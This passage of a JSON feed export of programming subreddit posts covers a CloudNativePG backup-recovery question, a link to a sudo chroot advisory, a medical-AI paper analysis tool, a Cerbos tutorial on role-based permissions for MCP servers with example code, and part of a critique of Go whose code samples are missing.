backup: barmanObjectStore: endpointURL: https://REDACTED destinationPath: s3://development/db s3Credentials: accessKeyId: name: s3 key: accessKeyId secretAccessKey: name: s3 key: accessKeySecret bootstrap: recovery: source: clusterBackup externalClusters: - name: clusterBackup barmanObjectStore: endpointURL: https://REDACTED destinationPath: s3://development/db s3Credentials: accessKeyId: name: s3 key: accessKeyId secretAccessKey: name: s3 key: accessKeySecret </code></pre><p>Note that I comment out the bootstrap section for init to succeed and do I see the wal/000... files in my obj store, so it's not a connection problem. I figure the bootstrap section only needs to be commented out once for initdb to run and place the initial backup files in s3, after which I'd never have to comment it out again.</p><p>The \"full recovery\" pod fails with:</p><pre><code>\"msg\":\"Error while restoring a backup\",\"logging_pod\":\"uno-postgres-1-full-recovery\",\"error\":\"no target backup found\",\"stacktrace\": </code></pre>","contentLength":1742,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Vulnerability Advisory: Sudo chroot Elevation of Privilege","url":"https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot","date":1751372419,"author":"/u/FryBoyter","guid":178936,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lp0784/vulnerability_advisory_sudo_chroot_elevation_of/"},{"title":"[Media] Rust + Svelte for single binary web apps","url":"https://www.reddit.com/r/rust/comments/1lozkov/media_rust_svelte_for_single_binary_web_apps/","date":1751370540,"author":"/u/HugoDzz","guid":178932,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[P] I created an open-source tool to analyze 1.5M medical AI papers on PubMed","url":"https://www.reddit.com/r/MachineLearning/comments/1lozfbp/p_i_created_an_opensource_tool_to_analyze_15m/","date":1751370063,"author":"/u/Avienir","guid":178934,"unread":true,"content":"<p>I've been working on a personal project to understand how AI is actually being used in medical research (not just the hype), and thought some of you might find the results interesting.</p><p>After analyzing nearly 1.5 million PubMed papers that use AI methods, I found some intersting results:</p><ul><li><strong>Classical ML still dominates</strong>: Despite all the deep learning hype, traditional algorithms like logistic regression and random forests account for 88.1% of all medical AI research</li><li><strong>Algorithm preferences by medical condition</strong>: Different health problems gravitate toward specific algorithms </li><li><strong>Transformer takeover timeline</strong>: You can see the exact point (around 2022) when transformers overtook LSTMs in medical research</li></ul><p>I built an interactive dashboard where you can:</p><ul><li>Search by medical condition to see which algorithms researchers are using</li><li>Track how algorithm usage has evolved over time</li><li>See the distribution across classical ML, deep learning, and LLMs</li></ul><p>One of the trickiest parts was filtering out false positives (like \"GAN\" meaning Giant Axonal Neuropathy vs. Generative Adversarial Network).</p><p>The tool is completely free, hosted on Hugging Face Spaces, and open-source. I'm not trying to monetize this - just thought it might be useful for researchers or anyone interested in healthcare AI trends.</p><p>Happy to answer any questions or hear suggestions for improving it!</p>","contentLength":1339,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A guide to fine-grained permissions in MCP servers","url":"https://www.cerbos.dev/blog/dynamic-authorization-for-ai-agents-guide-to-fine-grained-permissions-mcp-servers","date":1751369099,"author":"/u/West-Chard-1474","guid":179075,"unread":true,"content":"<p>AI Agents are rapidly evolving beyond simple Retrieval-Augmented Generation (RAG) and are now expected to take action. This is made possible through standards like the Model Context Protocol (MCP), which allows agents to interact with external tools and APIs. However, this new capability introduces a critical challenge: implementing fine-grained permissions and access controls based on “who can do what?”.</p><p>Hardcoding  statements for user roles is not a scalable or secure solution. Modern applications require a dynamic authorization model that can make decisions based on a rich set of attributes - a model often referred to as Policy-Based Access Control or Attribute-Based Access Control.</p><p>This guide will walk you through building a secure MCP server where AI Agent tool access is managed by Cerbos, a decoupled, policy-driven authorization service. You will learn how to enforce fine-grained authorization by externalizing access controls into human-readable policies.</p><blockquote><p>See how to implement dynamic authorization for AI agents, and fine-grained permissions in MCP servers, using Cerbos - <a href=\"https://www.cerbos.dev/secure-your-mcp-server-workshop\">speak with an engineer</a>.</p></blockquote><h3>The challenge. Static permissions in a dynamic AI world</h3><p>When an AI Agent acts on behalf of a user, it must be subject to delegated (or an attenuated form of) permissions as that user. The challenge is that these Permissions are often complex and context-dependent. For example:</p><ul><li>A user might be able to  an expense but not  it.</li><li>A manager might be able to  expenses, but only for their own team.</li><li>An admin might be the only one who can  records.</li></ul><p>Implementing this logic directly in the MCP server creates brittle, hard-to-manage code. A change in your authorization policy requires a code change and a full redeployment.</p><h3>The solution. Decoupled authorization with Cerbos and MCP</h3><p>The Model Context Protocol (MCP) is a specification that standardizes communication between AI Agents and external tools. An MCP server exposes a list of available tools, which any MCP client, be it a human in a chat application or a native AI agent, can then invoke to perform actions in your system.</p><p>Cerbos is a stateless, <a href=\"https://www.cerbos.dev/product-cerbos-pdp\">open source authorization</a> service that externalizes access controls into declarative YAML policies. Your application queries the Cerbos Policy Decision Point with a question like, \"Can this principal perform this action on this resource?\" Cerbos evaluates the relevant policies and returns a simple allow/deny decision in milliseconds. This enables powerful <a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/pbac\">PBAC</a> and <a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/abac\">ABAC</a> without complicating your application logic.</p><p>By combining MCP and Cerbos, you build a system where the MCP server defines , but dynamically enables only the ones the user has permission to use for a given request.</p><h3>Step-by-step implementation guide</h3><h4>Step 1: Declarative policy authoring</h4><p>First, define your access controls in a Cerbos policy. This policy will govern which roles have permission to use which tools (actions).</p><p>Create a  directory and add the following  file.</p><p>File: <code>policies/mcp_expenses.yaml</code></p><pre><code>apiVersion: \"api.cerbos.dev/v1\"\nresourcePolicy:\n  version: \"default\"\n  resource: \"mcp::expenses\"\n  rules:\n    - actions: [\"list_expenses\"]\n      effect: EFFECT_ALLOW\n      roles: [\"admin\", \"manager\", \"user\"]\n\n    - actions: [\"add_expense\"]\n      effect: EFFECT_ALLOW\n      roles: [\"user\"]\n\n    - actions: [\"approve_expense\", \"reject_expense\"]\n      effect: EFFECT_ALLOW\n      roles: [\"admin\", \"manager\"]\n\n    - actions: [\"delete_expense\", \"superpower_tool\"]\n      effect: EFFECT_ALLOW\n      roles: [\"admin\"]\n</code></pre><h4>Step 2: Deploying the Cerbos PDP</h4><p>Run the Cerbos PDP in Docker, mounting your policies directory. This makes your authorization policies live and ready to be queried.</p><pre><code>docker run --rm -it -p 3593:3593 \\\n  -v \"$(pwd)/policies\":/policies \\\n  ghcr.io/cerbos/cerbos:latest\n</code></pre><h4>Step 3: Integrating the MCP server</h4><p>Create a Node.js Express server that connects to the Cerbos PDP.</p><pre><code>npm install express @modelcontextprotocol/sdk @cerbos/grpc\n</code></pre><ol start=\"2\"><li>Create the server: The code below defines every tool but uses  to perform a central authorization check. Based on the response, it dynamically enables only the permitted tools for the session. How the identity gets passed to this is out of scope, but with the recent OAuth improvements in the MCP spec, you will be able to token with the user's identity from an OAuth2 authorization server and pass it through to the MCP server.</li></ol><pre><code>import express from \"express\";\nimport { McpServer } from \"@modelcontextprotocol/sdk/server/mcp.js\";\nimport { StreamableHTTPServerTransport } from \"@modelcontextprotocol/sdk/server/streamableHttp.js\";\nimport { GRPC } from \"@cerbos/grpc\";\nimport { randomUUID } from \"node:crypto\";\n\nconst cerbos = new GRPC(\"localhost:3593\", { tls: false });\n\nasync function getServer({ user, sessionId }) {\n  const server = new McpServer({ name: \"CerbFinance MCP Server\" });\n\n  // Example tools - actual implementation is out of scope\n  const tools = {\n    list_expenses: server.tool(\n      \"list_expenses\",\n      \"Lists expenses.\",\n      {},\n      { title: \"List Expenses\" },\n      async () =&gt; ({ content: [{ type: \"text\", text: \"...\" }] })\n    ),\n    add_expense: server.tool(\n      \"add_expense\",\n      \"Adds an expense.\",\n      {},\n      { title: \"Add Expense\" },\n      async () =&gt; ({ content: [{ type: \"text\", text: \"...\" }] })\n    ),\n    approve_expense: server.tool(\n      \"approve_expense\",\n      \"Approves an expense.\",\n      {},\n      { title: \"Approve Expense\" },\n      async () =&gt; ({ content: [{ type: \"text\", text: \"...\" }] })\n    ),\n    reject_expense: server.tool(\n      \"reject_expense\",\n      \"Rejects an expense.\",\n      {},\n      { title: \"Reject Expense\" },\n      async () =&gt; ({ content: [{ type: \"text\", text: \"...\" }] })\n    ),\n    delete_expense: server.tool(\n      \"delete_expense\",\n      \"Deletes an expense.\",\n      {},\n      { title: \"Delete Expense\" },\n      async () =&gt; ({ content: [{ type: \"text\", text: \"...\" }] })\n    ),\n    superpower_tool: server.tool(\n      \"superpower_tool\",\n      \"Grants superpowers.\",\n      {},\n      { title: \"Superpower Tool\" },\n      async () =&gt; ({ content: [{ type: \"text\", text: \"...\" }] })\n    ),\n  };\n\n  const toolNames = Object.keys(tools);\n\n  // Central Authorization Check\n  const authorizedTools = await cerbos.checkResource({\n    principal: { id: user.id, roles: user.roles },\n    resource: { kind: \"mcp::expenses\", id: sessionId },\n    actions: toolNames,\n  });\n\n  for (const toolName of toolNames) {\n    if (authorizedTools.isAllowed(toolName)) {\n      tools[toolName].enable();\n    } else {\n      tools[toolName].disable();\n    }\n  }\n\n  server.sendToolListChanged();\n  return server;\n}\n\nconst app = express();\napp.use(express.json());\n\n// Middleware to simulate user authentication - use OAuth in production\napp.use((req, res, next) =&gt; {\n  req.user = { id: \"user-123\", roles: [\"user\"] }; // Test different roles here\n  next();\n});\n\napp.post(\"/mcp\",  async (req, res) =&gt; {\n  const transport = new StreamableHTTPServerTransport({\nsessionIdGenerator: undefined,\n});\n  const server = await getServer({\n    user: req.user,\n    sessionId: req.sessionId || randomUUID(),\n  });\n  await server.connect(transport);\n  await transport.handleRequest(req, res, req.body);\n});\napp.listen(3000, () =&gt; console.log(\"MCP Server running on port 3000\"));\n</code></pre><h3>Testing your policy-driven AI agent</h3><p>You can test your server using the MCP Client extension in VS Code.</p><ol><li>Open the Command Palette (Ctrl+Shift+P) and select \"MCP: Add Server\".</li><li>Enter your server URL: <code>http://localhost:3000/mcp</code>.</li><li>Run in Copilot to open a chat window. The available tools will be listed.</li></ol><p>Example prompts by role: Change the  in  to simulate different users.</p><ul><li>As a  ():\n<ul><li><code>\"Add an expense for $100\"</code> -&gt; Succeeds</li><li> -&gt; Fails (The agent reports it doesn't have the tool).</li></ul></li><li>As a  (<code>roles: ['manager', 'user']</code>):\n<ul><li> -&gt; Succeeds</li><li> -&gt; Fails</li></ul></li><li>As an  ():\n<ul><li> -&gt; Succeeds</li></ul></li></ul><h3>Beyond roles - the power of ABAC</h3><p><a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/rbac\">Role-Based Access Control</a> is just the beginning. The real power of a decoupled authorization system is implementing ABAC. With Cerbos, you can write policies that use attributes from the user (), the resource, or the request itself.</p><p>For example, to restrict managers to approving expenses only up to a certain amount, you could pass the amount as an attribute and write a condition, then do an additional check inside the tool implementation:</p><p> (snippet of the Cerbos call):</p><pre><code>await cerbos.checkResource({\n  principal: { id: user.id, roles: user.roles },\n  resource: {\n    kind: \"mcp::expenses\",\n    id: sessionId,\n    attr: { amount: 150 } // Pass resource attributes\n  },\n  actions: [\"approve_expense\"],\n});\n</code></pre><p><code>policies/mcp_expenses.yaml</code> (snippet of the policy rule):</p><pre><code>- actions: [\"approve_expense\"]\n  effect: EFFECT_ALLOW\n  roles: [\"manager\"]\n  condition:\n    match:\n      # The manager can only approve if the expense amount is less than 1000\n      expr: request.resource.attr.amount &lt; 1000\n</code></pre><p>This demonstrates true fine-grained authorization that goes far beyond simple roles.</p><p>By decoupling your authorization logic using Cerbos, you can build powerful, secure, and scalable AI Agents. This architecture allows you to manage Permissions through declarative policies, enabling you to implement everything from simple role-based rules to sophisticated ABAC without touching your application code. As AI agents become more integrated into our workflows, a robust, policy-driven approach to access controls is a necessity.</p><p>For further details on mastering dynamic authorization for MCP servers with Cerbos, <a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/dynamic-authorization-for-MCP-servers\">check out this piece</a>.</p>","contentLength":9414,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1loz4jd/a_guide_to_finegrained_permissions_in_mcp_servers/"},{"title":"Lies we tell ourselves to keep using Golang","url":"https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang","date":1751368552,"author":"/u/Nekuromento","guid":179015,"unread":true,"content":"<div><p>\n                    👋 This page was last updated ~3 years ago. Just so you know.\n                </p></div><p data-bo=\"117\">In the two years since I’ve posted <a href=\"https://fasterthanli.me/articles/i-want-off-mr-golangs-wild-ride\">I want off Mr Golang’s Wild\nRide</a>, it’s made the rounds time and\ntime again, on Reddit, on Lobste.rs, on HackerNews, and elsewhere.</p><p data-bo=\"329\">And every time, it elicits the same responses:</p><ul><li>You talk about Windows: that’s not what Go is good at! (Also, who cares?)</li><li>This is very one-sided: you’re not talking about the  sides of Go!</li><li>You don’t understand the compromises Go makes.</li><li>Large companies use Go, so it can’t be  bad!</li><li>Modelling problems “correctly” is too costly, so caring about correctness is moot.</li><li>Correctness is a spectrum, Go lets you trade some for development speed.</li><li>Your go-to is Rust, which also has shortcomings, so your argument is invalid.</li></ul><p data-bo=\"878\">There’s also a vocal portion of commenters who wholeheartedly agree with the\nrant, but let’s focus on unpacking the apparent conflict here.</p><p data-bo=\"1019\">I’ll first spend a short amount of time pointing out clearly disingenuous\narguments, to get them out of the way, and then I’ll move on to the fairer\ncomments, addressing them as best I can.</p><a href=\"https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang#the-author-is-a-platypus\"></a><p data-bo=\"1239\">When you don’t want to hear something, one easy way to <em>not have to think about\nit at all</em> is to convince yourself that whoever is saying it is incompetent, or\nthat they have ulterior motives.</p><p data-bo=\"1433\">For example, the top comment on HackerNews right now starts like this:</p><blockquote><p data-bo=\"1507\">The author fundamentally misunderstands language design.</p></blockquote><p data-bo=\"1565\">As an impostor syndrome enthusiast, I would normally be sympathetic to such\ncomments. However, it is a lazy and dismissive way to consider any sort of\nfeedback.</p><p data-bo=\"1727\">It doesn’t take much skill to notice a problem.</p><p data-bo=\"1776\">In fact, as developers get more and more senior, they tend to ignore more and\nmore problems, because they’ve gotten so used to it. That’s the way it’s always\nbeen done, and they’ve learned to live with them, so they’ve stopped questioning\nit any more.</p><p data-bo=\"2029\">Junior developers however, get to look at everything again with a fresh pair of\neyes: they haven’t learned to ignore all the quirks yet, so it feels\n to them, and they tend to question it (if they’re made to feel\nsafe enough to voice their concerns).</p><p data-bo=\"2296\">This alone is an extremely compelling reason to hire junior developers, which I\nwish more companies would do, instead of banking on the fact that “seniors can\nget up-to-speed with our current mess faster”.</p><p data-bo=\"2503\">As it happens, I am  a junior developer, far from it. Some way or another,\nover the past 12 years, seven different companies have found an excuse to pay me\nenough money to cover rent and then some.</p><p data-bo=\"2707\">I did, in fact, <a href=\"https://ooc-lang.github.io/\">design a language</a> all the way back in\n2009 (when I  a wee programmer baby), focused mainly on syntactic sugar\nover C. At the time it was deemed interesting enough to warrant an invitation to\nOSCON (my first time in Portland Oregon, the capital of grunge, coffee, poor\nweather and whiteness), where I got to meet other young and not-so-young\nwhippersnappers (working on Io, Ioke, Wren, JRuby, Clojure, D, Go, etc.)</p><p data-bo=\"3174\">It was a very interesting conference: I’m still deeply ashamed by the\npresentation I gave, but I remember fondly the time an audience member asked the\nGo team <strong>“why did you choose to ignore any research about type systems since the\n1970s”</strong>? I didn’t fully understand the implications at the time, but I sure do\nnow.</p><p data-bo=\"3493\">I have since thoroughly lost interest in my language, because I’ve started\ncaring about semantics a lot more than syntax, which is why I also haven’t\nlooked at Zig, Nim, Odin, etc: I am no longer interested in “a better C”.</p><p data-bo=\"3718\">But <em>all of that is completely irrelevant</em>. It doesn’t matter who points out that\n“maybe we shouldn’t hit ourselves in the head with a rake repeatedly”: that\nfeedback ought to be taken under advisement no matter who it comes from.</p><a href=\"https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang#mom-smokes-so-it-s-probably-okay\"><h2>Mom smokes, so it’s probably okay</h2></a><p data-bo=\"3988\">One of the least effective way to shop for technologies (which CTOs, VPs of\nengineering, principals, senior staff and staff engineers need to do regularly)\nis to look at what other companies are using.</p><p data-bo=\"4191\">It is a great way to  technologies to evaluate (that or checking\nThoughtWorks’ <a href=\"https://www.thoughtworks.com/radar\">Tech Radar</a>), but it’s far\nfrom enough.</p><p data-bo=\"4358\">A piece from company X on “how they used technology Y”, will \nreflect the true cost of adopting that technology. By the point the engineers\nbehind the post have been bullied into filling out the company’s tech blog after\nmonths of an uphill battle, the decision has been made, and there’s no going\nback.</p><p data-bo=\"4676\">This kind of blog doesn’t lend itself to coming out and admitting that mistakes\nwere made. It’s supposed to make the company look good. It’s supposed to attract\nnew hires. It’s supposed to help us stay .</p><p data-bo=\"4891\">Typically, scathing indictments of technologies come from , who\nhave simply decided that they, as a person, can afford making a lot of people\nangry. Companies typically cannot.</p><p data-bo=\"5431\">You can be impressed, that  are using Go, right now, and that\nthey have gone all the way to Davy Jones’ Locker and back to solve complex\nproblems that ultimately helps deliver value to customers.</p><p data-bo=\"5646\">Or you can be , as you realize that those complex problems only exist\n. Those complex problems would not exist in other\nlanguages, not even in C, which I can definitely not be accused of shilling for\n(and would not recommend as a Go replacement).</p><p data-bo=\"5931\">A lot of the pain in the  article is caused by:</p><ul><li>Go not having sum types — making it really awkward to have a type that is\n“either an IPv4 address or an IPv6 address”</li><li>Go choosing which data structures you need — in this case, it’s the\none-size-fits-all slice, for which you pay 24 bytes on 64-bit machines.</li><li>Go not letting you do operator overloading, harkening back to the Java days\nwhere  isn’t the same as </li><li>Go’s lack of support for immutable data — the only way to prevent something\nfrom being mutated is to only hand out copies of it, and to \nto not mutate it in the code that actually has access to the inner bits.</li><li>Go’s unwillingness to let you make an opaque “newtype”. The only way to do\nit is to make a separate package and use interfaces for indirection, which is\ncostly  awkward.</li></ul><p data-bo=\"6806\">Unless you’re out for confirmation bias, that whole article is a very compelling\nargument against using Go for that specific problem.</p><p data-bo=\"6941\">And yet Tailscale is using it. Are they wrong? Not necessarily! Because their\nteam is made up of a bunch of . As evidenced by the  article,\nabout the Go linker.</p><p data-bo=\"7122\">Because they’re Go experts, they know the cost of using Go upfront, and they’re\nequipped to make the decision whether or not it’s worth it. They know how Go\nworks deep down (something Go marketing pinky-swears you <em>never need to worry\nabout, why do you ask?</em>), so if they hit edge cases, they can dive into it, fix\nit, and wait for their fix to be upstreamed (if ever).</p><p data-bo=\"7493\">But chances are, . This is not your org. You are not Google\neither, and you cannot afford to build a whole new type system on top of Go just\nto make your project (Kubernetes) work at all.</p><a href=\"https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang#the-good-parts\"></a><p data-bo=\"7718\">But okay - Tailscale’s usage of Go is pretty  still. Just like my\n2020 piece about Windows raised an army of “but that’s not what Go is good for”\nobjections, you could dismiss Tailscale’s posts as “well that’s on you for\nwanting to ship stuff on iOS / doing low-level network stuff”.</p><p data-bo=\"8014\">Fair enough! Okay. Let’s talk about what makes Go compelling.</p><p data-bo=\"8077\">Go is a pretty good async runtime, with opinionated defaults, a\n<a href=\"https://go.dev/blog/ismmkeynote\">state-of-the-art garbage collector</a> with two\nknobs, and tooling that would make C developers jealous, if they bothered\nlooking outside their bubble.</p><p data-bo=\"8325\">This also describes <a href=\"https://nodejs.org/en/\">Node.js</a> from the very start (which\nis essentially libuv + V8), and I believe it also describes “modern Java”, with\nAPIs like NIO. Although I haven’t checked what’s happening in Java land too\nclosely, so if you’re looking for an easy inaccuracy to ignore this whole\narticle, there you go: that’s a freebie.</p><p data-bo=\"8678\">Because the async runtime is core to the language, it comes with tooling that\n make Rust developers jealous! I talk about it in <a href=\"https://fasterthanli.me/articles/request-coalescing-in-async-rust\">Request coalescing in\nasync Rust</a>, for example.</p><p data-bo=\"8906\">Go makes it easy to dump backtraces (stack traces) for all running goroutines in\na way <a href=\"https://tokio.rs/\">tokio</a> doesn’t, at this time. It is also able to\ndetect deadlocks, it comes with its own profiler, it seemingly lets you not\nworry about <a href=\"https://journal.stuffwithstuff.com/2015/02/01/what-color-is-your-function/\">the color of\nfunctions</a>, etc.</p><p data-bo=\"9258\">Go’s tooling around package management, refactoring, cross-compiling, etc., is\neasy to pick up and easy to love — and certainly feels at first like a definite\nimprovement over the many person-hours lost to the whims of pkg-config,\nautotools, CMake, etc. Until you reach some of the arbitrary limitations that\nsimply do not matter to the Go team, and then you’re on your own.</p><p data-bo=\"9636\">All those and more explains why many, including me, were originally enticed by\nit: enough to write piles and piles of it, until its shortcomings have finally\nbecome impossible to ignore, by which point it’s too late. You’ve made your bed,\nand now you’ve got to make yourself feel okay about lying in it.</p><p data-bo=\"9941\">But one  does not a platform make.</p><p data-bo=\"9994\">The really convenient async runtime is not the only thing you adopted. You also\nadopted a  toolchain, a build system, a calling convention, a\nsingle GC (whether it works for you or not), the set of included batteries, some\nof which you CAN swap out, but the rest of the ecosystem won’t, and most\nimportantly, you adopted a language that happened by accident.</p><p data-bo=\"10367\">I will grant you that caring  about something is grounds for\nsuspicion. It is no secret that a large part of what comes out of academia is\nwoefully inapplicable in the industry at this time: it is easy to lose oneself\nin the abstract, and come up with convoluted schemes to solve problems that do\nnot really exist for anyone else.</p><p data-bo=\"10709\">I imagine this is the way some folks feel about Rust.</p><p data-bo=\"10764\">But caring  about something is dangerous too.</p><p data-bo=\"10823\">Evidently, the Go team didn’t  to design a language. What they really\nliked was their async runtime. And they wanted to be able to implement TCP, and\nHTTP, and TLS, and HTTP/2, and DNS, etc., on top of it. And then web services on\ntop of all of that.</p><p data-bo=\"11081\">And so they didn’t. They didn’t design a language. It sorta just “happened”.</p><p data-bo=\"11159\">Because it needed to be familiar to “Googlers, fresh out of school, who probably\nlearned some Java/C/C++/Python” (Rob Pike, Lang NEXT 2014), it borrowed from all\nof these.</p><p data-bo=\"11332\">Just like C, it doesn’t concern itself with error handling . Everything\nis a big furry ball of mutable state, and it’s on you to add ifs and elses to\nVERY CAREFULLY (and very manually) ensure that you do not propagate invalid\ndata.</p><p data-bo=\"11573\">Just like Java, it tries to erase the distinction between “value” and\n“reference”, and so it’s impossible to tell from the callsite if something is\ngetting mutated or not:</p><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"go\" data-bo=\"11746\"></figure><p data-bo=\"11886\">Depending on whether the signature for change is this:</p><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"go\" data-bo=\"11942\"></figure><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"go\" data-bo=\"12000\"></figure><p data-bo=\"12049\">…the local  in  will either get mutated or not.</p><p data-bo=\"12109\">And since, just like C  Java, you do not get to decide what is mutable and\nwhat is immutable (the  keyword in C is essentially advisory,\n<a href=\"https://twitter.com/jckarter/status/1520059601277792256\">kinda</a>), passing a\nreference to something (to avoid a costly copy, for example) is fraught with\nrisk, like it getting mutated from under you, or it being held somewhere\nforever, preventing it from being freed (a lesser, but very real, problem).</p><p data-bo=\"12562\">Go fails to prevent many other classes of errors: it makes it easy to\naccidentally <a href=\"https://fasterthanli.me/articles/a-rust-match-made-in-hell\">copy a mutex</a>, rendering it\ncompletely ineffective, or leaving struct fields uninitialized (or rather,\ninitialized to their zero value), resulting in countless logic errors.</p><p data-bo=\"12858\">Taken in isolation, each of these and more can be dismissed as “just a thing to\nbe careful about”. And breaking down an argument to its smallest pieces,\nrebutting them one by one, is a self-defense tactic used by those who cannot\nafford to adjust their position in the slightest.</p><p data-bo=\"13139\">Which makes perfect sense, because Go is really hard to move away from.</p><a href=\"https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang#go-is-an-island\"></a><p data-bo=\"13232\">Unless you use cgo, (but <a href=\"https://dave.cheney.net/2016/01/18/cgo-is-not-go\">cgo is not\nGo</a>), you are living in the\nPlan 9 cinematic universe.</p><p data-bo=\"13375\">The Go toolchain does not use the assembly language everyone else knows about.\nIt does not use the linkers everyone else knows about. It does not let you use\nthe debuggers everyone knows about, the <a href=\"https://valgrind.org/\">memory checkers</a>\neveryone knows about, or the calling conventions everyone else has agreed to\nsuffer, in the interest of interoperability.</p><p data-bo=\"13737\">Go is closer to\n<a href=\"https://en.wikipedia.org/wiki/Open-world_assumption\">closed-world</a> languages\nthan it is to C or C++. Even Node.js, Python and Ruby are not as hostile to\n<a href=\"https://en.wikipedia.org/wiki/Foreign_function_interface\">FFI</a>.</p><p data-bo=\"13973\">To a large extent, this is a feature: being different is . And it\ncomes with its benefits. Being able to profile the internals of the TLS and HTTP\nstacks the same way you do your business logic is fantastic. (Whereas in dynamic\nlanguages, the stack trace stops at OpenSSL). And that code takes full advantage\nof the lack of function coloring: it can let the  worry about\nnon-blocking I/O and scheduling.</p><p data-bo=\"14398\">But it comes at a terrible cost, too. There is excellent tooling out there for\nmany things, which you cannot use with Go (you can use it for the cgo parts,\nbut again, you should not use cgo if you want the Real Go Experience). All the\n“institutional knowledge” there is lost, and must be relearned from scratch.</p><p data-bo=\"14711\">It also makes it extremely hard to integrate Go with anything else, whether it’s\nupstream (calling C from Go) or downstream (calling Go from Ruby). Both these\nscenarios involve cgo, or, if you’re unreasonably brave, <a href=\"https://words.filippo.io/rustgo/\">a terrifying\nhack</a>.</p><p data-bo=\"15081\">Making Go play nice with another language (any other language) is really hard.\nCalling C from Go, nevermind the cost of crossing the FFI boundary, involves\n<a href=\"https://pkg.go.dev/cmd/cgo#hdr-Passing_pointers\">manual descriptor tracking</a>,\nso as to not break the GC. (WebAssembly had the same problem before <a href=\"https://github.com/WebAssembly/reference-types/blob/master/proposals/reference-types/Overview.md\">reference\ntypes</a>!)</p><p data-bo=\"15503\">Calling Go from  involves shoving the whole Go runtime (GC included)\ninto whatever you’re running: expect a very large static library and all the\noperational burden of running Go code as a regular executable.</p><p data-bo=\"15723\">After spending years doing those FFI dances in both directions, I’ve reached the\nconclusion that <strong>the only good boundary with Go is a network boundary</strong>.</p><p data-bo=\"15879\">Integrating with Go is  if you can afford to pay the\nlatency cost of doing RPC over TCP (whether it’s a REST-ish HTTP/1 API,\nsomething like JSON-RPC, a more complicated scheme like GRPC, etc.). It’s also\nthe only way to make sure it doesn’t “infect” your whole codebase.</p><p data-bo=\"16172\">But even that is costly: you need to maintain invariants on both sides of the\nboundary. In Rust, one would typically reach for something like\n<a href=\"https://serde.rs/\">serde</a> for that, which, combined with sum types and the lack\nof zero values, lets you make  that what you’re holding is what\nyou think you’re holding: if a number is zero, it was meant to be zero, it\nwasn’t just missing.</p><p data-bo=\"16573\">(All this goes out the window if you use a serialization format like\n<a href=\"https://developers.google.com/protocol-buffers\">protobuf</a>, which has all the\ndrawbacks of Go’s type system and none of the advantages).</p><p data-bo=\"16780\">That still leaves you with the Go side of things, where unless you use some sort\nof <a href=\"https://go-ozzo.github.io/ozzo-validation/\">validation package</a> religiously,\nyou need to be ever vigilant not to let bad data slip in, because the compiler\ndoes  to help you maintain those invariants.</p><p data-bo=\"17076\">And that brings us to the larger overall problem of the Go .</p><a href=\"https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang#all-or-nothing-so-let-s-do-nothing\"><h2>All or nothing (so let’s do nothing)</h2></a><p data-bo=\"17188\">I’ve mentioned “leaving struct fields uninitialized”. This happens easily when\nyou make a code change from something like this:</p><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"go\" data-bo=\"17317\"></figure><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"go\" data-bo=\"17520\"></figure><p data-bo=\"17718\">That second program prints this:</p><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"\" data-bo=\"17752\"></figure><p data-bo=\"17804\">We’ve essentially changed the function signature, but forgot to update a\ncallsite. This doesn’t bother the compiler at all.</p><p data-bo=\"17929\">Oddly enough, if our function was structured like this:</p><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"go\" data-bo=\"17986\"></figure><p data-bo=\"18133\">Then we’d get a compile error:</p><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"\" data-bo=\"18165\"></figure><p data-bo=\"18310\">Why does the Go compiler suddenly care if we provide explicit values now? If the\nlanguage was self-consistent, it would let me omit both parameters, and just\ndefault to zero.</p><p data-bo=\"18486\">Because one of the tenets of Go is that zero values are good, actually.</p><p data-bo=\"18559\">See, they let you go fast. If you  mean for  to be zero, you can just\nnot specify it.</p><p data-bo=\"18654\">And sometimes it works fine, because zero values  mean something:</p><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"go\" data-bo=\"18725\"></figure><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"\" data-bo=\"18933\"></figure><p data-bo=\"18995\">This is fine! Because the  slice is actually a reference type, and its\nzero value is , and  just returns zero, because “obviously”, a\nnil slice is empty.</p><p data-bo=\"19174\">And sometimes it’s  fine, because zero values don’t mean what you think\nthey mean:</p><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"go\" data-bo=\"19263\"></figure><figure role=\"region\" aria-label=\"Code block\" translate=\"no\" data-lang=\"\" data-bo=\"19475\"></figure><p data-bo=\"19678\">In that case, you should’ve initialized the map first (which is also \na reference type), with , or with a map literal.</p><p data-bo=\"19814\">That alone is enough to cause incidents and outages that wake people up at\nnight, but everything gets worse real fast when you consider the <a href=\"https://dave.cheney.net/2014/03/19/channel-axioms\">Channel\nAxioms</a>:</p><ul><li>A send to a  channel blocks forever</li><li>A receive from a  channel blocks forever</li><li>A send to a closed channel panics</li><li>A receive from a closed channel returns the zero value immediately</li></ul><p data-bo=\"20221\">Because <em>there had to be a meaning</em> for nil channels, this is what was picked.\nGood thing there’s pprof to find those deadlocks!</p><p 